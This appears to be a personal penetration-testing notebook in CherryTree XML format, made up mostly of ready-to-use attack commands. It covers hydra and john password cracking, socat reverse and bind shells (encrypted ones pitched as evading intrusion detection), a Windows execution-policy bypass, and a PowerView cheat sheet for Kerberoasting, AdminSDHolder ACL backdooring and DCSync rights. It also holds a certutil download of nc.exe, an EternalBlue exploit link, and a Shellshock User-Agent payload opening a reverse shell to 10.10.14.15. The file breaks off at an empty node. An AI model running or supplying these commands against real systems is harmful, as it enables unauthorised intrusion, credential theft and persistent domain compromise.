<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="bruteforce_cracking" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393552" ts_lastsave="1662016183">
    <node name="hydra" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393562" ts_lastsave="1655393676">
      <rich_text>SSH bruteforce
hydra -l &lt;username&gt; -P &lt;password_file&gt; &lt;ip&gt; ssh 
hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;ip&gt; ssh

ftp bruteforce
hydra -l &lt;username&gt; -P &lt;password_file&gt; &lt;ip&gt; ftp 
hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;ip&gt; ftp 

http-post
hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;host&gt; https-post-form "/api/login:username=^USER^&amp;password=^PASS^:Incorrect credentials"</rich_text>
    </node>
    <node name="fcrackzip" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393573" ts_lastsave="1655393597">
      <rich_text>fcrackzip -u -D -p &lt;wordlist&gt; &lt;file&gt;</rich_text>
    </node>
    <node name="john_the_ripper" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655481131" ts_lastsave="1655483291">
      <rich_text>automatic cracking
john --wordlist=[path to wordlist] [path to file]

hash identifier
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py

unshadow [path to passwd] [path to shadow]

specify format
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt

</rich_text>
      <rich_text family="monospace">rar2john [rar file] &gt; [output file]</rich_text>
      <rich_text>

</rich_text>
      <rich_text family="monospace">john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt</rich_text>
      <rich_text>
</rich_text>
    </node>
    <node name="hashcat" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656688587" ts_lastsave="1656688588">
      <rich_text>hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt</rich_text>
    </node>
  </node>
  <node name="compressions" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393695" ts_lastsave="1662477240">
    <node name="gzip" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393716" ts_lastsave="1655393739">
      <rich_text>gzip -d &lt;file_name&gt;</rich_text>
    </node>
    <node name="tar" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393725" ts_lastsave="1655393747">
      <rich_text>decompress
tar -xf &lt;file_name&gt;</rich_text>
    </node>
    <node name="zip" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393728" ts_lastsave="1655393753">
      <rich_text>decompress 
unzip &lt;zip_file&gt;</rich_text>
    </node>
  </node>
  <node name="QEMU/KVM+VIRTM" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1662477240" ts_lastsave="1663434109">
    <rich_text>auto resize
</rich_text>
    <rich_text family="monospace">xrandr --output Virtual-1 --auto</rich_text>
    <rich_text>

copas
</rich_text>
    <rich_text family="monospace">sudo apt install spice-vdagent spice-webdavd</rich_text>
    <rich_text>

allow qemu bridge conf
</rich_text>
    <rich_text scale="h3" background="#f9f2f4" foreground="#c7254e">echo "allow all" | sudo tee /etc/qemu/${USER}.conf</rich_text>
    <rich_text>
</rich_text>
    <rich_text scale="h3" background="#f9f2f4" foreground="#c7254e">echo "include /etc/qemu/${USER}.conf" | sudo tee --append /etc/qemu/bridge.conf</rich_text>
    <rich_text>
</rich_text>
    <rich_text scale="h3" background="#f9f2f4" foreground="#c7254e">sudo chown root:${USER} /etc/qemu/${USER}.conf</rich_text>
    <rich_text>
</rich_text>
    <rich_text scale="h3" background="#f9f2f4" foreground="#c7254e">sudo chmod 640 /etc/qemu/${USER}.conf</rich_text>
    <rich_text>

chmod u+s /usr/libexec/qemu-bridge-helper

mount sharepoint
sudo mount -t 9p -o trans=virtio /hostshare hostfiles/

auto mount
add the following to </rich_text>
    <rich_text scale="h3">Â </rich_text>
    <rich_text family="monospace">/etc/fstab</rich_text>
    <rich_text>
/hostshare /hostfiles 9p trans=virtio,version=9p2000.L,rw 0 0</rich_text>
  </node>
  <node name="smbclient" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663434109" ts_lastsave="1663434130">
    <rich_text>list smbclient
smbclient -L &lt;IP&gt; -U &lt;user&gt; -P &lt;pass&gt;
</rich_text>
  </node>
  <node name="database" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393786" ts_lastsave="1655393844">
    <node name="sqllite" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393789" ts_lastsave="1655393790">
      <rich_text>using sqllite for .db file
sqlite3 &lt;database-name&gt;

checking all table names
.tables

check column from table
PRAGMA table_info(&lt;table_name&gt;);</rich_text>
    </node>
  </node>
  <node name="forensics" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393844" ts_lastsave="1655393999">
    <node name="exiftool" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393848" ts_lastsave="1655393858">
      <rich_text>install:
sudo apt install poppler-utils

extract image metadata:
exiftool &lt;image_file&gt;</rich_text>
    </node>
    <node name="PDFinfo" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393858" ts_lastsave="1655393859">
      <rich_text>install
sudo apt install pdfinfo

extracting metadata
pdfinfo &lt;file_pdf&gt;</rich_text>
    </node>
  </node>
  <node name="networking" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655393999" ts_lastsave="1655800209">
    <rich_text foreground="#d4d4d4">OpenVPN connect
sudo openvpn &lt;file_input&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">connect to smbshare
smbclient //[IP]/[SHARE] -U &lt;username&gt; -p &lt;port&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">FTP normal
ftp &lt;host&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">FTP abnormal port
ftp &lt;host&gt; -p &lt;port&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">inside FTP commands</rich_text>
    <rich_text>
</rich_text>
    <rich_text foreground="#d4d4d4">download file FTP
get &lt;file&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#dcdcaa">read</rich_text>
    <rich_text foreground="#d4d4d4"> file FTP
more &lt;file&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">ssh normal
ssh &lt;host&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">ssh abnormal port
ssh &lt;host&gt; -p &lt;port&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">SCP
scp &lt;source_file&gt; &lt;destination_file&gt;
scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">download or get via http
wget </rich_text>
    <rich_text link="webs https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt" foreground="#d4d4d4">https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</rich_text>
    <rich_text foreground="#d4d4d4">
curl https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">listen </rich_text>
    <rich_text foreground="#c586c0">for</rich_text>
    <rich_text foreground="#d4d4d4"> specific packet
sudo tcpdump &lt;ip&gt; proto &lt;protocol -- i.e. </rich_text>
    <rich_text foreground="#d7ba7d">\\</rich_text>
    <rich_text foreground="#d4d4d4">tcmp&gt; -i &lt;network interface i.e tun0&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">netcat listen
nc -lvp [listening port]</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">connect to tellnet
telnet &lt;ip&gt; &lt;port&gt;</rich_text>
    <node name="socat" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655800209" ts_lastsave="1655800236">
      <rich_text underline="single" style="italic">Reverse Shells</rich_text>
      <rich_text>
As mentioned previously, the  syntax for socat gets a lot harder than that of netcat. Here's the  syntax for a basic reverse shell listener in socat:

</rich_text>
      <rich_text family="monospace">socat TCP-L:&lt;port&gt; -</rich_text>
      <rich_text>

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to </rich_text>
      <rich_text family="monospace">nc -lvnp &lt;port&gt;</rich_text>
      <rich_text>.
On Windows we would use this command to connect back:
</rich_text>
      <rich_text family="monospace">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</rich_text>
      <rich_text>

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:
</rich_text>
      <rich_text family="monospace">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:"bash -li"</rich_text>
      <rich_text>

</rich_text>
      <rich_text underline="single" style="italic">Bind Shells</rich_text>
      <rich_text>
On a Linux target we would use the following command:
</rich_text>
      <rich_text family="monospace">socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"</rich_text>
      <rich_text>

On a Windows target we would use this command for our listener:
</rich_text>
      <rich_text family="monospace">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</rich_text>
      <rich_text>

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
</rich_text>
      <rich_text family="monospace">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</rich_text>
      <rich_text underline="single" style="italic">
</rich_text>
      <rich_text>
Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is </rich_text>
      <rich_text style="italic">significantly </rich_text>
      <rich_text>more  stable. As mentioned earlier, socat is an incredibly versatile tool;  however, the following technique is perhaps one of its most useful  applications. Here is the new listener syntax:

</rich_text>
      <rich_text family="monospace">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</rich_text>
      <rich_text> 

Let's  break this command down into its two parts. As usual, we're connecting  two points together. In this case those points are a listening port, and  a file. Specifically, we are passing in the current TTY as a file and  setting the echo to be zero. This is approximately equivalent to using  the Ctrl + Z, </rich_text>
      <rich_text family="monospace">stty raw -echo; fg</rich_text>
      <rich_text> trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
The  first listener can be connected to with any payload; however, this  special listener must be activated with a very specific socat command.  This means that the target must have socat installed. Most machines do  not have socat installed by default, however, it's possible to upload a </rich_text>
      <rich_text link="webs https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">precompiled socat binary</rich_text>
      <rich_text>, which can then be executed as normal.
The special command is as follows:
</rich_text>
      <rich_text family="monospace">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:"bash -li",pty,stderr,sigint,setsid,sane</rich_text>
      <rich_text>

This is a handful, so let's break it down.
The  first part is easy -- we're linking up with the listener running on our  own machine. The second part of the command creates an interactive bash  session with  </rich_text>
      <rich_text family="monospace">EXEC:"bash -li"</rich_text>
      <rich_text>

One of the many great things about socat is that it's capable  of creating encrypted shells -- both bind and reverse. Why would we want  to do this? Encrypted shells cannot be spied on unless you have the  decryption key, and are often able to bypass an IDS as a result.

We  covered how to create basic shells in the previous task, so that syntax  will not be covered again here. Suffice to say that any time </rich_text>
      <rich_text family="monospace">TCP</rich_text>
      <rich_text> was used as part of a command, this should be replaced with </rich_text>
      <rich_text family="monospace">OPENSSL</rich_text>
      <rich_text>  when working with encrypted shells. We'll cover a few examples at the  end of the task, but first let's talk about certificates. 
We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
                  
</rich_text>
      <rich_text family="monospace">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</rich_text>
      <rich_text>

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single </rich_text>
      <rich_text family="monospace">.pem</rich_text>
      <rich_text> file:
</rich_text>
      <rich_text family="monospace">cat shell.key shell.crt &gt; shell.pem</rich_text>
      <rich_text>

Now, when we set up our reverse shell listener, we use:
</rich_text>
      <rich_text family="monospace">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</rich_text>
      <rich_text>

This sets up an OPENSSL listener using our generated certificate. </rich_text>
      <rich_text family="monospace">verify=0</rich_text>
      <rich_text> tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate </rich_text>
      <rich_text underline="single" style="italic">must</rich_text>
      <rich_text> be used on whichever device is listening.

To connect back, we would use:
</rich_text>
      <rich_text family="monospace">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</rich_text>
      <rich_text>

The same technique would apply for a bind shell:
Target:
</rich_text>
      <rich_text family="monospace">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</rich_text>
      <rich_text>

Attacker:
</rich_text>
      <rich_text family="monospace">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</rich_text>
    </node>
  </node>
  <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1663605128">
    <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1663521397">
      <rich_text>get hostname / pc name
hostname

get username
whoami

check network config
ipconfig

detailed ipconfig
ipconfig /all

netstat this command will display protocol statistics and current TCP/IP network connections. 
netstat

netstat good default
netstat -a -b -f

netstat help
netstat /?

net command is primarily used to manage network resources.
net

net help
net help

call control panel
control

control panel update config
control /name Microsoft.WindowsUpdate

add user as admin
</rich_text>
      <rich_text family="monospace">net localgroup administrators &lt;username&gt; /add</rich_text>
      <rich_text>

add user
</rich_text>
      <rich_text family="monospace">net user &lt;username&gt; &lt;password&gt; /add</rich_text>
      <rich_text>

systeminfo

dir "search term*" /s</rich_text>
    </node>
    <node name="env_path" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394602" ts_lastsave="1655394612">
      <rich_text>windows root directory
%windir%</rich_text>
    </node>
    <node name="GUI" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394612" ts_lastsave="1655394630">
      <rich_text>make user:
Start menu &gt;&gt; type "Other User" &gt;&gt; Add user

system environment variable
Control Panel &gt; System and Security &gt; System &gt; Advanced system settings &gt; Environment Variables 
or 
Settings &gt; System &gt; About &gt; system info &gt; Advanced system settings &gt; Environment Variable</rich_text>
    </node>
    <node name="run" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394630" ts_lastsave="1655394636">
      <rich_text>user and group manager
lusrmgr.msc

microsoft configuration
msconfig

user account settings
UserAccountControlSettings.exe

computer management
compmgmt.msc

perfmon manager
perfmon

system information
msinfo32.exe

resource manager
resmon.exe

registry edit
regedit

windows firewall
WF.msc</rich_text>
    </node>
    <node name="powershell" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655649452" ts_lastsave="1655725264">
      <rich_text>bypass execution policy
</rich_text>
      <rich_text family="monospace">powershell -ep bypass</rich_text>
      <rich_text>

importing (?) powerview script
</rich_text>
      <rich_text family="monospace">. .\PowerView.ps1</rich_text>
    </node>
    <node name="powerview" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655649812" ts_lastsave="1655727658">
      <rich_text link="webs https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</rich_text>
      <rich_text>

get fulldata and selecting OS
Get-NetComputer -fulldata | select operatingsystem

get users and selecting domain name
</rich_text>
      <rich_text family="monospace">Get-NetUser | select cn</rich_text>
      <rich_text>

show all group
Get-NetGroup

# PowerView's last major overhaul is detailed here: http://www.harmj0y.net/blog/powershell/make-powerview-great-again/
#   tricks for the 'old' PowerView are at https://gist.github.com/HarmJ0y/3328d954607d71362e3c

# the most up-to-date version of PowerView will always be in the dev branch of PowerSploit:
#   https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

# New function naming schema:
#   Verbs:
#       Get : retrieve full raw data sets
#       Find : âfindâ specific data entries in a data set
#       Add : add a new object to a destination
#       Set : modify a given object
#       Invoke : lazy catch-all
#   Nouns:
#       Verb-Domain* : indicates that LDAP/.NET querying methods are being executed
#       Verb-WMI* : indicates that WMI is being used under the hood to execute enumeration
#       Verb-Net* : indicates that Win32 API access is being used under the hood


# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
Get-DomainGroup -MemberIdentity &lt;User/Group&gt;

# get all the effective members of a group, 'recursing down'
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

# get all users with passwords changed &gt; 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset&lt;=$Date)" -Properties samaccountname,pwdlastset

# all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# all users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# find all users with an SPN set (likely service accounts)
Get-DomainUser -SPN

# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# find any users/computers with constrained delegation st
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# return the local *groups* of a remote server
    

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local

# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

# find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..."

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain &lt;domain&gt; | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity &lt;User/Group&gt;

# enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential

# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local

# grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose

# audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs

# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

# save a PowerView object to disk for later usage
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# find all policies applied to a current machine
Get-DomainGPO -ComputerIdentity windows1.testlab.local

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name

# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
</rich_text>
    </node>
    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1663605130">
      <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe</rich_text>
    </node>
    <node name="windows_hacks" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663435801" ts_lastsave="1663605117">
      <rich_text link="webs https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</rich_text>
      <rich_text> eternal_blue</rich_text>
    </node>
  </node>
  <node name="shell" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663587498" ts_lastsave="1663587499">
    <rich_text family="monospace">User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</rich_text>
  </node>
  <node name="smb_enum" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663517460" ts_lastsave="1663517460">
